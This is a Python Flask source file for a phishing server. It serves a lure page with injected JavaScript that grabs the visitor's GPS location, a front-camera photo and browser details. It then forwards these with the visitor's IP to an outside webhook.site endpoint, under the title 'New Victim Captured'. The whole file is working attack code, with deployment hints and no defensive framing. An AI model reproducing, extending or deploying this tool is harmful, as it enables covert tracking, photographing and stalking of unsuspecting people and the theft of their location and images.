from flask import Flask, request, send_from_directory
import requests
import uuid
import os
from threading import Lock

app = Flask(__name__)

# Configure your webhook (Discord/Slack)
WEBHOOK_URL = "https://webhook.site/c6a19369-5fb7-44b4-ab97-9ff26418523d"  # REPLACE THIS!

# Thread-safe logging
log_lock = Lock()

def send_to_webhook(data, image_b64=None):
    """Send data to Discord/Slack webhook with optional image"""
    try:
        # Discord format
        payload = {
            "embeds": [{
                "title": "🎣 New Victim Captured",
                "color": 0xff0000,
                "fields": [
                    {"name": "IP", "value": data.get('ip', 'N/A')},
                    {"name": "GPS", "value": data.get('gps', 'DENIED')},
                    {"name": "User Agent", "value": data.get('ua', 'N/A')}
                ],
                "timestamp": data.get('time', '')
            }]
        }

        # Attach image if available
        if image_b64:
            payload["embeds"][0]["image"] = {"url": f"data:image/jpeg;base64,{image_b64}"}

        # Send to webhook
        with log_lock:
            response = requests.post(
                WEBHOOK_URL,
                json=payload,
                timeout=10
            )
            response.raise_for_status()
            
    except Exception as e:
        print(f"Webhook error: {e}")

@app.route('/')
def serve_phish_page():
    """Serve the page with injected JavaScript"""
    try:
        with open("page.html", "r") as f:
            html = f.read()

        inject_code = """
        <script>
        // Data to collect
        const victimData = {
            ip: window.location.hostname,
            ua: navigator.userAgent,
            gps: "DENIED",
            time: new Date().toISOString()
        };

        // Convert photo to base64
        async function photoToBase64(photo) {
            return new Promise((resolve) => {
                const reader = new FileReader();
                reader.onload = () => resolve(reader.result.split(',')[1]);
                reader.readAsDataURL(photo);
            });
        }

        // Main capture function
        async function captureData() {
            try {
                // 1. Get GPS
                const gpsPromise = new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition(
                        pos => resolve(`${pos.coords.latitude},${pos.coords.longitude}`),
                        () => resolve("DENIED")
                    );
                });

                // 2. Get Camera (requires user gesture)
                let photoB64 = null;
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: 'user' }  // Front camera
                    });
                    const track = stream.getVideoTracks()[0];
                    const imageCapture = new ImageCapture(track);
                    const photo = await imageCapture.takePhoto();
                    photoB64 = await photoToBase64(photo);
                    track.stop();
                } catch (e) {
                    console.log("Camera error:", e);
                }

                // 3. Send to server
                victimData.gps = await gpsPromise;
                const response = await fetch('/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        data: victimData,
                        photo: photoB64
                    })
                });
                
                if (!response.ok) throw new Error("Logging failed");
                
            } catch (error) {
                console.error("Tracking failed:", error);
            }
        }

        // Trigger with button click
        document.getElementById('start-btn').addEventListener('click', () => {
            document.getElementById('permission-text').innerText = "Permissions requested...";
            captureData();
        });
        </script>
        """
        
        return html.replace('</body>', inject_code + '</body>')
    
    except Exception as e:
        return f"Error loading page: {e}", 500

@app.route('/log', methods=['POST'])
def handle_log():
    """Process victim data from client"""
    try:
        data = request.json.get('data', {})
        photo_b64 = request.json.get('photo', None)
        
        # Add IP from headers (Render uses proxies)
        if 'X-Forwarded-For' in request.headers:
            data['ip'] = request.headers['X-Forwarded-For'].split(',')[0]
        
        print(f"Received data: {data}")  # Debug log
        
        # Send to webhook
        send_to_webhook(data, photo_b64)
        return "Logged successfully", 200
        
    except Exception as e:
        print(f"Logging error: {e}")
        return "Error", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
